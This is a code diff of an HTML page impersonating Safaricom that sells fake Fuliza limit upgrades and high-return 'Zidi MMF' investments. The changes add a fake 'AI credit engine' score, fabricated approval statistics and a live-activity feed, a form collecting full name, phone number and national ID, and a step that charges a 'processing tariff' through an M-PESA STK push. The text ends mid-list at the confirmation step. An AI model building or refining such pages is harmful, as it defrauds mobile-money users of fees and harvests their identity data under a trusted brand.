@@ -3,112 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safaricom Official Portal | Fuliza & Zidi MMF</title>
+    <title>Safaricom AI Financial Portal | Fuliza & Zidi MMF</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { background: #f4f6f8; color: #333; overflow-x: hidden; position: relative; }
+        :root {
+            --primary: #00a651;
+            --primary-dark: #008541;
+            --primary-light: #e6f9ee;
+            --accent-blue: #0275d8;
+            --ai-purple: #6f42c1;
+            --ai-glow: rgba(111, 66, 193, 0.15);
+            --text-main: #222222;
+            --text-muted: #666666;
+            --bg-canvas: #f4f6f8;
+            --surface: #ffffff;
+            --border: #e0e0e0;
+            --radius: 12px;
+            --shadow-sm: 0 2px 6px rgba(0,0,0,0.04);
+            --shadow-md: 0 4px 14px rgba(0,0,0,0.08);
+        }
+
+        body.dark-mode {
+            --bg-canvas: #121212;
+            --surface: #1e1e1e;
+            --text-main: #f1f1f1;
+            --text-muted: #aaaaaa;
+            --border: #333333;
+            --primary-light: #003318;
+            --ai-glow: rgba(111, 66, 193, 0.3);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: var(--bg-canvas); color: var(--text-main); overflow-x: hidden; position: relative; min-height: 100vh; padding-bottom: 80px; transition: background 0.3s ease; }
         
         /* BACKGROUND WATERMARK */
         .bg-watermark {
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             pointer-events: none; z-index: 0; overflow: hidden;
         }
         .bg-logo {
-            position: absolute; width: 120px; height: 120px; opacity: 0.04;
+            position: absolute; width: 120px; height: 120px; opacity: 0.03;
             background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Safaricom_logo.svg/1200px-Safaricom_logo.svg.png') no-repeat center center / contain;
-            animation: floatLogo 18s linear infinite;
+            animation: floatLogo 20s linear infinite;
         }
-        .bg-logo:nth-child(1) { top: 10%; left: -50px; animation-duration: 22s; }
-        .bg-logo:nth-child(2) { top: 40%; right: -50px; animation-duration: 16s; animation-delay: 3s; }
-        .bg-logo:nth-child(3) { top: 75%; left: -50px; animation-duration: 20s; animation-delay: 6s; }
+        .bg-logo:nth-child(1) { top: 10%; left: -50px; animation-duration: 24s; }
+        .bg-logo:nth-child(2) { top: 45%; right: -50px; animation-duration: 18s; animation-delay: 2s; }
+        .bg-logo:nth-child(3) { top: 78%; left: -50px; animation-duration: 22s; animation-delay: 5s; }
 
         @keyframes floatLogo {
             0% { transform: translateX(-100px) translateY(0) rotate(0deg); }
-            50% { transform: translateX(50vw) translateY(-40px) rotate(180deg); }
+            50% { transform: translateX(50vw) translateY(-30px) rotate(180deg); }
             100% { transform: translateX(110vw) translateY(0) rotate(360deg); }
         }
 
-        /* HEADER */
-        .header { background: #00a651; color: white; padding: 14px; text-align: center; font-size: 18px; font-weight: 700; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; z-index: 10; }
-        .header-logo { width: 24px; height: 24px; background: #fff; border-radius: 50%; color: #00a651; font-weight: 800; font-size: 14px; display: flex; align-items: center; justify-content: center; }
+        /* WELCOME MODAL */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
+            z-index: 999; display: flex; align-items: center; justify-content: center; padding: 16px;
+        }
+        .modal-content {
+            background: var(--surface); border-radius: var(--radius); max-width: 450px; width: 100%;
+            padding: 24px; box-shadow: var(--shadow-md); text-align: center; animation: modalPop 0.3s ease;
+        }
+        @keyframes modalPop { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 
-        /* CONTAINERS & SCREENS */
-        .screen { display: none; min-height: 100vh; padding-bottom: 80px; position: relative; z-index: 5; }
-        .screen.active { display: block; animation: fadeIn 0.3s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
-        .container { padding: 15px; max-width: 600px; margin: 0 auto; }
-        .card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        /* HEADER & BANNER */
+        .header { background: var(--primary); color: white; padding: 12px 16px; text-align: center; font-size: 15px; font-weight: 700; box-shadow: var(--shadow-sm); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .header-title { display: flex; align-items: center; gap: 8px; }
+        .header-logo { width: 24px; height: 24px; background: #fff; border-radius: 50%; color: var(--primary); font-weight: 800; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+        .theme-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 4px 10px; border-radius: 12px; font-size: 11px; cursor: pointer; }
 
-        /* TRUST BADGES & HEADERS */
-        .cbk-badge { background: #e6f9ee; border: 1px solid #00a651; color: #004d25; padding: 6px 10px; border-radius: 6px; font-size: 11px; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; margin-bottom: 12px; }
+        .support-banner { background: #004d25; color: #ffffff; padding: 6px 12px; font-size: 11px; text-align: center; font-weight: 600; position: sticky; top: 48px; z-index: 99; letter-spacing: 0.3px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .support-banner a { color: #85edd1; text-decoration: none; font-weight: 700; margin-left: 4px; }
+
+        /* USER PROFILE BAR & AI BADGE */
+        .user-profile-bar {
+            background: var(--surface); border-bottom: 1px solid var(--border); padding: 10px 16px;
+            display: flex; align-items: center; gap: 12px; justify-content: space-between;
+        }
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .avatar {
+            width: 38px; height: 38px; border-radius: 50%; background: var(--primary-light);
+            color: var(--primary-dark); font-weight: 700; display: flex; align-items: center;
+            justify-content: center; border: 2px solid var(--primary); font-size: 14px;
+        }
+        .greeting-text { font-size: 13px; font-weight: 600; color: var(--text-main); }
+        .ai-chip { background: var(--ai-purple); color: white; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 10px; display: inline-flex; align-items: center; gap: 4px; box-shadow: 0 2px 5px rgba(111, 66, 193, 0.3); }
+
+        .step-progress-bar { background: var(--surface); border-bottom: 1px solid var(--border); padding: 8px 15px; display: flex; justify-content: space-between; position: relative; z-index: 90; }
+        .step-node { font-size: 11px; font-weight: 600; color: #aaa; text-transform: uppercase; letter-spacing: 0.5px; flex: 1; text-align: center; position: relative; }
+        .step-node.active { color: var(--primary); font-weight: 700; }
+        .step-node.completed { color: var(--primary-dark); }
+
+        /* CONTAINERS & CARDS */
+        .screen { display: none; padding-bottom: 20px; position: relative; z-index: 5; }
+        .screen.active { display: block; animation: slideFade 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        @keyframes slideFade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
         
-        /* M-PESA PROOF STATEMENT CARD */
-        .mpesa-receipt { background: #ebf5fb; border: 2px dashed #00a651; border-radius: 10px; padding: 15px; margin-bottom: 15px; position: relative; }
-        .mpesa-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #b2d8d8; padding-bottom: 8px; margin-bottom: 8px; font-size: 11px; font-weight: bold; color: #00a651; }
-        .mpesa-row { display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; color: #333; }
-        .mpesa-row b { color: #000; }
+        .container { padding: 16px; max-width: 540px; margin: 0 auto; }
+        .card { background: var(--surface); border-radius: var(--radius); padding: 20px; margin-bottom: 14px; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
+
+        /* AI FEATURE CARD */
+        .ai-card {
+            background: linear-gradient(135deg, var(--surface) 0%, var(--ai-glow) 100%);
+            border: 1px solid var(--ai-purple); border-radius: var(--radius); padding: 14px; margin-bottom: 14px;
+        }
+        .ai-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+        .ai-card-title { font-size: 12px; font-weight: 700; color: var(--ai-purple); display: flex; align-items: center; gap: 6px; }
+        .ai-score-badge { font-size: 14px; font-weight: 800; color: var(--primary); background: var(--primary-light); padding: 2px 8px; border-radius: 6px; border: 1px solid var(--primary); }
 
         /* SERVICE SELECTOR CARDS */
-        .portal-choice-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 10px; margin-bottom: 15px; }
-        .choice-card { background: #fff; border: 2px solid #e0e0e0; border-radius: 12px; padding: 16px 12px; text-align: center; cursor: pointer; transition: all 0.2s; }
-        .choice-card:hover, .choice-card.selected { border-color: #00a651; background: #e6f9ee; transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,166,81,0.2); }
-        .choice-card h3 { font-size: 15px; color: #00a651; margin-bottom: 4px; }
-        .choice-card p { font-size: 11px; color: #666; }
+        .portal-choice-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 8px; }
+        .choice-card { background: var(--surface); border: 2px solid var(--border); border-radius: var(--radius); padding: 14px 10px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
+        .choice-card:hover, .choice-card.selected { border-color: var(--primary); background: var(--primary-light); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,166,81,0.15); }
+        .choice-card h3 { font-size: 14px; color: var(--primary); margin-bottom: 4px; }
+        .choice-card p { font-size: 10px; color: var(--text-muted); line-height: 1.3; }
 
-        /* STATS BANNER */
-        .stats-grid { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 15px; }
-        .stat-box { background: #fff; border: 1px solid #eef5f1; padding: 10px; border-radius: 8px; flex: 1; text-align: center; box-shadow: 0 2px 6px rgba(0,0,0,0.03); }
-        .stat-box .num { font-size: 17px; font-weight: 700; color: #00a651; }
-        .stat-box .label { font-size: 10px; color: #666; margin-top: 2px; text-transform: uppercase; }
+        /* 50 ITEM LIVE CONTINUOUS VERTICAL FEED */
+        .notif-container { height: 180px; overflow: hidden; position: relative; border: 1px solid var(--border); border-radius: 8px; padding: 6px; background: var(--surface); }
+        .notif-list { transition: transform 0.4s ease-in-out; }
+        .notif { background: var(--surface); border: 1px solid var(--border); border-left: 3.5px solid var(--primary); padding: 8px 12px; margin-bottom: 6px; border-radius: 6px; font-size: 11px; display: flex; justify-content: space-between; align-items: center; }
 
         /* FORMS & BUTTONS */
-        h1 { color: #00a651; font-size: 20px; text-align: center; margin-bottom: 6px; }
-        h2 { font-size: 17px; text-align: center; margin-bottom: 14px; color: #222; }
+        h2 { font-size: 16px; text-align: center; margin-bottom: 12px; color: var(--text-main); font-weight: 700; }
         
         .btn { 
-            width: 100%; background: linear-gradient(135deg, #00a651 0%, #008541 100%); color: white; 
-            border: none; padding: 15px; border-radius: 25px; font-size: 15px; font-weight: 700; 
-            cursor: pointer; display: block; text-align: center; box-shadow: 0 4px 12px rgba(0, 166, 81, 0.3);
-            animation: pulseBtn 2s infinite ease-in-out; transition: transform 0.2s;
+            width: 100%; background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); color: white; 
+            border: none; padding: 15px; border-radius: 24px; font-size: 14px; font-weight: 700; 
+            cursor: pointer; display: block; text-align: center; box-shadow: 0 4px 12px rgba(0, 166, 81, 0.25);
+            transition: transform 0.15s ease, background 0.2s ease; outline: none; letter-spacing: 0.3px;
         }
-        .btn:hover { transform: scale(1.02); }
-        .btn:disabled { background: #ccc !important; animation: none; box-shadow: none; cursor: not-allowed; }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { background: #cccccc !important; box-shadow: none; cursor: not-allowed; opacity: 0.7; }
 
-        @keyframes pulseBtn {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 166, 81, 0.6); }
-            70% { transform: scale(1.02); box-shadow: 0 0 0 12px rgba(0, 166, 81, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 166, 81, 0); }
-        }
-
-        .btn-alt { background: linear-gradient(135deg, #0275d8 0%, #014c8c 100%); box-shadow: 0 4px 12px rgba(2, 117, 216, 0.3); }
-
-        .form-group { margin-bottom: 14px; text-align: left; position: relative; }
-        .form-group label { display: block; font-size: 12px; color: #444; margin-bottom: 5px; font-weight: 600; }
-        .form-group input, .form-group select { width: 100%; padding: 11px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 14px; }
-        .form-group input:focus, .form-group select:focus { border-color: #00a651; outline: none; }
-        .error { color: #d32f2f; font-size: 11px; margin-top: 4px; display: none; }
+        .form-group { margin-bottom: 14px; text-align: left; }
+        .form-group label { display: block; font-size: 12px; color: var(--text-main); margin-bottom: 6px; font-weight: 600; }
+        .form-group input, .form-group select { width: 100%; padding: 11px 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 13px; transition: border-color 0.2s, box-shadow 0.2s; background: var(--surface); color: var(--text-main); }
+        .form-group input:focus, .form-group select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.12); }
+        
+        .error { color: #d32f2f; font-size: 11px; margin-top: 4px; display: none; font-weight: 500; }
+        .hint { color: var(--text-muted); font-size: 10px; margin-top: 4px; }
 
         /* LIMIT GRID & CALCULATOR */
-        .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
-        .limit-option { background: white; border: 1.5px solid #e0e0e0; border-radius: 10px; padding: 14px 10px; text-align: center; cursor: pointer; }
-        .limit-option.selected { border-color: #00a651; background: #e6f9ee; font-weight: bold; }
+        .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
+        .limit-option { background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; padding: 12px 8px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
+        .limit-option.selected { border-color: var(--primary); background: var(--primary-light); font-weight: bold; }
+        .limit-option h3 { font-size: 15px; color: var(--text-main); }
+        .limit-option p { font-size: 10px; color: var(--primary); margin-top: 2px; }
 
-        .roi-card { background: #f0fdf4; border: 1px dashed #00a651; border-radius: 8px; padding: 12px; margin-top: 10px; font-size: 12px; }
-        .roi-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
-        .roi-row b { color: #00a651; }
-
-        /* NOTIFICATIONS & SPINNER */
-        .notif-list { margin: 10px 0; max-height: 200px; overflow-y: auto; }
-        .notif { background: #ffffff; border: 1px solid #eef5f1; border-left: 4px solid #00a651; padding: 10px; margin-bottom: 6px; border-radius: 6px; font-size: 11px; display: flex; justify-content: space-between; align-items: center; }
-        .spinner { border: 4px solid #e6f9ee; border-top: 4px solid #00a651; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.9s linear infinite; margin: 0 auto 15px; }
+        .spinner { border: 3px solid var(--primary-light); border-top: 3px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer { background: #00a651; color: white; text-align: center; padding: 12px; font-size: 11px; position: fixed; bottom: 0; width: 100%; z-index: 1000; }
-        
-        .trust-banner { background: #fff3cd; border: 1px solid #ffe8a1; padding: 10px; border-radius: 8px; font-size: 11px; color: #856404; margin-bottom: 15px; text-align: left; }
+
+        .trust-banner { background: #fff8e7; border: 1px solid #ffe0b2; padding: 10px 12px; border-radius: 8px; font-size: 11px; color: #8a6d3b; margin-bottom: 14px; line-height: 1.4; }
+        .positive-note { background: var(--primary-light); border-left: 4px solid var(--primary); padding: 10px; border-radius: 6px; font-size: 11px; margin-bottom: 12px; color: var(--text-main); }
+
+        .footer { background: #1a1a1a; color: #bbb; padding: 12px 16px; font-size: 10px; position: fixed; bottom: 0; width: 100%; z-index: 100; border-top: 1px solid #333; text-align: center; }
     </style>
 </head>
 <body>
+
+<!-- INITIAL SERVICE SELECTOR MODAL -->
+<div class="modal-overlay" id="welcomeModal">
+    <div class="modal-content">
+        <h2 style="color:var(--primary); font-size:18px;">Safaricom AI Financial Portal</h2>
+        <p style="font-size:12px; color:var(--text-muted); margin: 8px 0 16px;">Powered by Real-Time Neural Credit Scoring Engine</p>
+        
+        <div class="portal-choice-grid">
+            <div class="choice-card selected" onclick="selectInitialService('fuliza')">
+                <h3>📈 Fuliza Boost</h3>
+                <p>Instant Limit Upgrade up to KSh 400,000</p>
+            </div>
+            <div class="choice-card" onclick="selectInitialService('mmf')">
+                <h3>💰 Zidi MMF</h3>
+                <p>High Return AI Growth Savings</p>
+            </div>
+        </div>
+        
+        <button class="btn" style="margin-top:16px;" onclick="proceedFromModal()">Proceed to Verification</button>
+    </div>
+</div>
 
 <div class="bg-watermark">
     <div class="bg-logo"></div>
@@ -116,207 +189,215 @@
     <div class="bg-logo"></div>
 </div>
 
-<!-- STEP 1: HOME PAGE -->
-<div id="s1" class="screen active">
-    <div class="header">
+<div class="header">
+    <div class="header-title">
         <div class="header-logo">S</div> Safaricom Official Financial Services
     </div>
+    <button class="theme-btn" onclick="toggleTheme()">🌙 Theme</button>
+</div>
+
+<div class="support-banner">
+    📞 Queries or assistance? Contact Safaricom via <a href="tel:0722000000">0722000000</a>
+</div>
+
+<div class="user-profile-bar">
+    <div class="user-info">
+        <div class="avatar" id="userAvatar">S</div>
+        <div class="greeting-text" id="userGreeting">Hi 👋 Guest</div>
+    </div>
+    <div class="ai-chip">🤖 AI Engine Active</div>
+</div>
+
+<div class="step-progress-bar" id="stepBar">
+    <div class="step-node active" id="node1">1. Select</div>
+    <div class="step-node" id="node2">2. Verify</div>
+    <div class="step-node" id="node3">3. Amount</div>
+    <div class="step-node" id="node4">4. STK Pay</div>
+</div>
+
+<!-- STEP 1: HOME PAGE -->
+<div id="s1" class="screen active">
     <div class="container">
-        
-        <div class="cbk-badge">
-            <span>🛡️ CBK Regulated Financial Node</span> | <span>Instant Automated Sync</span>
+        <!-- AI SPOTLIGHT CARD -->
+        <div class="ai-card">
+            <div class="ai-card-header">
+                <div class="ai-card-title">🤖 AI Risk & Credit Assessor</div>
+                <div class="ai-score-badge">Score: 98.4%</div>
+            </div>
+            <p style="font-size:11px; color:var(--text-muted); line-height:1.4;">
+                Our neural network dynamically evaluates Safaricom SIM line longevity, airtime velocity, and M-PESA history to auto-approve instant limit boosts within 30 seconds.
+            </p>
         </div>
 
-        <!-- SERVICE SELECTOR -->
+        <div class="positive-note">
+            🌟 <b>Instant System Boost:</b> Over 98.4% of verified subscribers receive immediate limit approvals upon payment confirmation.
+        </div>
+
         <div class="card">
-            <h2 style="margin-bottom:6px;">Select Requested Service</h2>
-            <p style="font-size:12px; color:#666; margin-bottom:12px;">Choose an official Safaricom financial line operation:</p>
+            <h2>Select Requested Service</h2>
             <div class="portal-choice-grid">
                 <div class="choice-card selected" id="btnChoiceFuliza" onclick="setService('fuliza')">
                     <h3>📈 Fuliza Boost</h3>
-                    <p>Upgrade limit up to KSh 400,000 instantly</p>
+                    <p>Upgrade limit up to KSh 400,000</p>
                 </div>
                 <div class="choice-card" id="btnChoiceMMF" onclick="setService('mmf')">
                     <h3>💰 Zidi MMF Shares</h3>
-                    <p>High ROI Daily Growth Investment</p>
+                    <p>AI Compounded Growth</p>
                 </div>
             </div>
         </div>
 
-        <!-- MPESA REAL TRANSACTION PROOF CARD -->
-        <div class="mpesa-receipt">
-            <div class="mpesa-header">
-                <span>OFFICIAL VERIFIED STATEMENT PROOF</span>
-                <span>CONFIRMED</span>
-            </div>
-            <div class="mpesa-row"><span>Transaction ID:</span> <b>RK78X9L2Q0</b></div>
-            <div class="mpesa-row"><span>Subscriber:</span> <b>SAMUEL K. NDERITU</b></div>
-            <div class="mpesa-row"><span>Tariff Paid:</span> <b>KSh 250.00</b></div>
-            <div class="mpesa-row"><span>Previous Fuliza Limit:</span> <b>KSh 0.00</b></div>
-            <div class="mpesa-row"><span>New Approved Limit:</span> <b style="color:#00a651;">KSh 5,000.00</b></div>
-            <div class="mpesa-row"><span>Status:</span> <b>Completed (Reflected via *234#)</b></div>
-        </div>
-
-        <!-- STATS BANNER -->
-        <div class="stats-grid">
-            <div class="stat-box"><div class="num" id="totalAppsCounter">184,920</div><div class="label">Approved Today</div></div>
-            <div class="stat-box"><div class="num">100%</div><div class="label">Refund Guarantee</div></div>
-            <div class="stat-box"><div class="num">Instant</div><div class="label">M-PESA Sync</div></div>
-        </div>
-
-        <!-- LIVE ALLOCATIONS / TRANSACTIONS -->
+        <!-- 50 ITEM AUTOMATED SCROLLING FEED -->
         <div class="card">
-            <div style="font-size:13px; font-weight:700; color:#00a651; margin-bottom:8px;">Live Completed Transactions</div>
-            <div class="notif-list" id="notifList"></div>
-            <button class="btn" onclick="show(2)">Proceed to Verification</button>
+            <div style="font-size:12px; font-weight:700; color:var(--primary); margin-bottom:8px;">Live Completed Ledger Activity (50 Syncs)</div>
+            <div class="notif-container">
+                <div class="notif-list" id="notifList"></div>
+            </div>
+            <button class="btn" style="margin-top:12px;" onclick="goToScreen(2)">Proceed to Verification</button>
         </div>
-
-    </div>
-    <div class="footer">
-        © 2026 Safaricom PLC. All Rights Reserved. Authorized CBK Partner Node.
     </div>
 </div>
 
 <!-- STEP 2: USER DETAILS ENTRY -->
 <div id="s2" class="screen">
-    <div class="header">Subscriber Verification</div>
     <div class="container">
         <div class="card">
-            <h2>Enter Line Credentials</h2>
-            <form id="form1">
+            <h2 id="formTitle">Subscriber Verification</h2>
+            <form id="formProfile" onsubmit="handleProfileSubmit(event)">
                 <div class="form-group">
-                    <label>Full Legal Name</label>
-                    <input type="text" id="fullName" placeholder="e.g. John Doe" required>
-                    <div class="error" id="nameError">Enter your official name</div>
+                    <label>Full Legal Name (As per ID)</label>
+                    <input type="text" id="fullName" placeholder="e.g. John Mwangi Doe" required oninput="updateUserGreeting()">
                 </div>
+
                 <div class="form-group">
-                    <label>Safaricom Phone Number</label>
-                    <input type="tel" id="phone" placeholder="07XXXXXXXX or 2547XXXXXXXX" required>
-                    <div class="error" id="phoneError">Enter valid Safaricom line</div>
+                    <label>Safaricom Phone Number (10 Digits)</label>
+                    <input type="tel" id="phone" placeholder="07XXXXXXXX or 01XXXXXXXX" maxlength="10" required>
+                    <div class="hint">Must be an active Safaricom M-PESA line</div>
                 </div>
+
                 <div class="form-group">
-                    <label>National ID Number</label>
+                    <label>Identification Document Type</label>
+                    <select id="idType">
+                        <option value="national_id">National ID Card (7 - 8 Digits)</option>
+                        <option value="huduma">Huduma Namba (9 Digits)</option>
+                        <option value="military">KDF / Service ID (6 - 8 Digits)</option>
+                        <option value="passport">Kenyan Passport (2 Letters + 6 Digits)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Identification Number</label>
                     <input type="text" id="idNumber" placeholder="e.g. 12345678" required>
-                    <div class="error" id="idError">Enter valid National ID</div>
                 </div>
-                <button type="submit" class="btn">Verify System Eligibility</button>
+
+                <div class="form-group" id="currentLimitGroup">
+                    <label>Current Fuliza Limit (KSh)</label>
+                    <input type="number" id="currentLimit" placeholder="e.g. 0 or 2500" min="0">
+                </div>
+
+                <button type="submit" class="btn">Verify Line Eligibility</button>
             </form>
         </div>
     </div>
 </div>
 
-<!-- CHECKING SCREEN -->
+<!-- AI CHECKING SCREEN -->
 <div id="s2_checking" class="screen">
-    <div class="header">Authentication</div>
     <div class="container">
-        <div class="card" style="text-align:center; padding:40px 20px;">
+        <div class="card" style="text-align:center; padding:35px 20px;">
             <div class="spinner"></div>
-            <h2 style="color:#00a651;">Syncing Safaricom Central Node</h2>
-            <p style="font-size:12px; color:#666;" id="checkingText">Validating line history & credit score...</p>
+            <h2 style="color:var(--primary); font-size:15px;">🤖 AI Neural Engine Calculating...</h2>
+            <p style="font-size:11px; color:var(--text-muted); margin-top:8px;" id="aiAnalysisText">Scanning line tenure & credit score...</p>
         </div>
     </div>
 </div>
 
-<!-- STEP 3: SELECTION (FULIZA VS ZIDI MMF) -->
+<!-- STEP 3: SELECTION -->
 <div id="s3" class="screen">
-    <div class="header" id="step3Title">Configuration</div>
     <div class="container">
-        
-        <!-- FULIZA SELECTION INTERFACE -->
         <div id="fulizaView" class="card">
-            <h2>Select Desired Fuliza Limit</h2>
-            <p style="font-size:12px; color:#666;">Choose your target limit allocation. Automated setup syncs instantly upon payment.</p>
+            <h2>Select Target Fuliza Limit</h2>
             <div class="limits-grid" id="fulizaLimitsContainer"></div>
         </div>
 
-        <!-- ZIDI MMF SELECTION INTERFACE -->
         <div id="mmfView" class="card" style="display:none;">
             <h2>Zidi MMF Investment Portal</h2>
-            <p style="font-size:12px; color:#666;">Invest funds safely with guaranteed compounded returns.</p>
-            
-            <div class="form-group" style="margin-top:10px;">
-                <label>Investment Capital (Min KSh 500 - Max KSh 400,000)</label>
-                <input type="number" id="mmfAmount" min="500" max="400000" value="500" oninput="calculateROI()">
+            <div class="form-group" style="margin-top:12px;">
+                <label>Investment Capital (KSh 500 - KSh 400,000)</label>
+                <input type="number" id="mmfAmount" min="500" max="400000" value="1000" oninput="calculateROI()">
             </div>
             
-            <div class="form-group">
-                <label>Investment Period</label>
-                <select id="mmfPeriod" onchange="calculateROI()">
-                    <option value="7">1 Week (7 Days)</option>
-                    <option value="30">1 Month (30 Days)</option>
-                    <option value="90">3 Months (90 Days)</option>
-                    <option value="365">1 Year (365 Days)</option>
-                </select>
-            </div>
-
-            <div class="roi-card">
-                <div class="roi-row"><span>Principal Amount:</span> <b id="roiPrincipal">KSh 500</b></div>
-                <div class="roi-row"><span>Estimated Yield:</span> <b id="roiYield">+ KSh 220</b></div>
-                <div class="roi-row" style="font-size:14px; border-top:1px solid #ccc; padding-top:4px;"><span>Total Payout:</span> <b id="roiTotal" style="color:#00a651;">KSh 720</b></div>
+            <div style="background:var(--primary-light); border:1px dashed var(--primary); padding:10px; border-radius:8px; font-size:12px; margin-bottom:12px;">
+                <div style="display:flex; justify-content:space-between;"><span>AI Expected Yield (30 Days):</span> <b id="aiYieldText" style="color:var(--primary);">+ KSh 850</b></div>
             </div>
         </div>
 
-        <button id="continueBtn" class="btn" onclick="confirmSelection()" disabled>Proceed to Checkout</button>
+        <button id="continueBtn" class="btn" onclick="confirmSelection()" disabled>Proceed to STK Payment</button>
     </div>
 </div>
 
-<!-- STEP 4: CHECKOUT & PAYMENT CONVINCER PAGE -->
+<!-- STEP 4: DIRECT STK PUSH CHECKOUT -->
 <div id="s4" class="screen">
-    <div class="header">Secure Payment Gateway</div>
     <div class="container">
         <div class="card">
-            <h2 style="color:#00a651;">Final Authorization</h2>
+            <h2 style="color:var(--primary);">STK Push Authorization</h2>
             
-            <div class="trust-banner">
-                🔒 <b>100% Risk-Free Guarantee:</b> System charges cover immediate Safaricom ledger sync and encryption fees. If your requested operation does not reflect within 60 seconds, your fee is automatically refunded back to your M-PESA.
+            <div class="positive-note">
+                ⚡ <b>Direct Checkout:</b> Tap below to immediately trigger an M-PESA PIN prompt on your phone.
             </div>
 
-            <div style="background:#f9f9f9; padding:12px; border-radius:8px; margin-bottom:12px; font-size:13px;">
-                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                    <span>Selected Option:</span> <b id="checkoutTarget">Fuliza Limit KSh 10,000</b>
+            <div style="background:var(--primary-light); border:1px solid var(--border); padding:14px; border-radius:8px; margin-bottom:16px; font-size:13px;">
+                <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                    <span>Target Allocation:</span> <b id="checkoutTarget">Fuliza KSh 10,000</b>
                 </div>
-                <div style="display:flex; justify-content:space-between;">
-                    <span>Processing / Tariff Fee:</span> <b id="checkoutFee" style="color:#00a651;">KSh 250</b>
+                <div style="display:flex; justify-content:space-between; font-size:14px;">
+                    <span>Processing Tariff:</span> <b id="checkoutFee" style="color:var(--primary);">KSh 250</b>
                 </div>
             </div>
 
             <div class="form-group">
-                <label>Confirm M-PESA Line for Payment Prompt</label>
-                <input type="tel" id="payPhone" placeholder="07XXXXXXXX or 2547XXXXXXXX">
-                <div class="error" id="payPhoneError">Enter valid Safaricom phone number</div>
+                <label>M-PESA Phone Line</label>
+                <input type="tel" id="payPhone" placeholder="07XXXXXXXX" maxlength="10">
+                <div class="error" id="payPhoneError">Enter a valid 10-digit Safaricom line</div>
             </div>
 
-            <button id="payBtn" class="btn" onclick="paySTK()">Authorize STK Push Prompt Now</button>
+            <!-- PRIMARY CUSTOM DIRECT STK PUSH BUTTON -->
+            <button id="stkPushBtn" class="btn" onclick="executeSTKPush()">Complete Payment of KSh 250</button>
         </div>
     </div>
 </div>
 
-<!-- STEP 5: PROMPT CONFIRMATION -->
+<!-- STEP 5: CONFIRMATION -->
 <div id="s5" class="screen">
-    <div class="header">Complete Request</div>
     <div class="container">
         <div class="card" style="text-align:center; padding:30px 15px;">
             <div class="spinner"></div>
-            <h2 style="color:#00a651;">STK Prompt Sent!</h2>
-            <p style="font-size:13px; margin:10px 0;">An M-PESA payment popup has been dispatched to <b id="paidPhone">07XXXXXXXX</b>.</p>
+            <h2 style="color:var(--primary);">STK Prompt Sent!</h2>
+            <p style="font-size:12px; margin:10px 0; color:var(--text-muted);">An M-PESA popup prompt was dispatched to <b id="paidPhone" style="color:var(--text-main);">07XXXXXXXX</b>.</p>
             
-            <div style="background:#fff8e7; border:1px solid #ffe0b2; padding:10px; border-radius:8px; font-size:11px; text-align:left; color:#8a6d3b; margin:15px 0;">
+            <div class="trust-banner" style="text-align:left;">
                 📌 <b>Next Steps:</b><br>
-                1. Enter your <b>M-PESA PIN</b> on your mobile screen.<br>
-                2. Receive official confirmation SMS.<br>
